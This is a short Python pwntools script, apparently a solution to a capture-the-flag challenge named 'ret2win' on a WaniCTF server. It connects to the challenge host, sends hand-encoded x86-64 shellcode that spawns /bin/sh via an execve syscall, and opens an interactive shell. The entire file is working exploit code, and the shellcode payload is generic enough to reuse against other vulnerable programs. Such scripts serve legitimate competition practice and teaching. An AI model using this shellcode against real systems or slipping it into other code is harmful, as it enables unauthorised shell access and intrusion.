from pwn import *


#pc = process("./chall")
pc = remote('ret2win-pwn.wanictf.org', 9004)

shell_code = b"\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"

pc.sendline(shell_code)
pc.interactive()